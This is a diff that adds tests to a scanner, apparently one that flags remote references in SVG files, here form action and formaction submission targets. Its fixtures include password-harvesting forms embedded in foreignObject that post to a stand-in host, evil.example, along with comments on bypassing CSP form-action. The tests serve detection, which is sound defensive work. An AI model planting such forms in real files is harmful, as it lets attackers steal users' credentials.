@@ -215,3 +215,64 @@ test('reports srcset, poster and background targets', () => {
     'references a remote resource in <video> poster: https://evil.example/p.png',
   ]);
 });
+
+// Submission targets. A form posts nothing until a visitor submits it, so it
+// is not a subresource fetch; it is in this file because it reached the
+// published corpus through the identical gap -- an attribute the scanner had
+// no rule for, carrying an ordinary https URL that no scheme check objects to.
+test('reports a remote form action on HTML embedded in a foreignObject', () => {
+  // script-src 'none' makes this HTML inert without constraining the form, and
+  // form-action is a navigation directive, so the header's default-src 'none'
+  // is not its fallback. The address bar still reads as this origin while the
+  // password goes to evil.example.
+  assert.deepEqual(
+    findRemoteReferences(
+      svg(
+        '<foreignObject><form action="https://evil.example/collect" method="post">' +
+          '<input type="password" name="pw"/><button>Sign in</button></form></foreignObject>',
+      ),
+    ),
+    ['submits to a remote host in <form> action: https://evil.example/collect'],
+  );
+});
+
+test('reports a formaction that overrides a same-origin action', () => {
+  // The <form> itself reads as same-origin in a diff; the button re-points it.
+  assert.deepEqual(
+    findRemoteReferences(
+      svg(
+        '<foreignObject><form action="/local"><button formaction="https://evil.example/c">go</button>' +
+          '<input type="submit" formaction="//evil.example/d"/></form></foreignObject>',
+      ),
+    ),
+    [
+      'submits to a remote host in <button> formaction: https://evil.example/c',
+      'submits to a remote host in <input> formaction: //evil.example/d',
+    ],
+  );
+});
+
+test('reports a cleartext form action', () => {
+  // `http:` with however many separators reaches the named host just as `//`
+  // does, and a browser that upgrades the submission still sends it there.
+  assert.deepEqual(
+    findRemoteReferences(
+      svg(
+        '<foreignObject><form action="http:evil.example/c"><button>x</button></form></foreignObject>',
+      ),
+    ),
+    ['submits to a remote host in <form> action: http://evil.example/c'],
+  );
+});
+
+test('leaves a relative or same-origin form action alone', () => {
+  assert.deepEqual(
+    findRemoteReferences(
+      svg(
+        '<foreignObject><form action="/search"><button formaction="./go">x</button></form>' +
+          '<form><button>no action at all</button></form></foreignObject>',
+      ),
+    ),
+    [],
+  );
+});
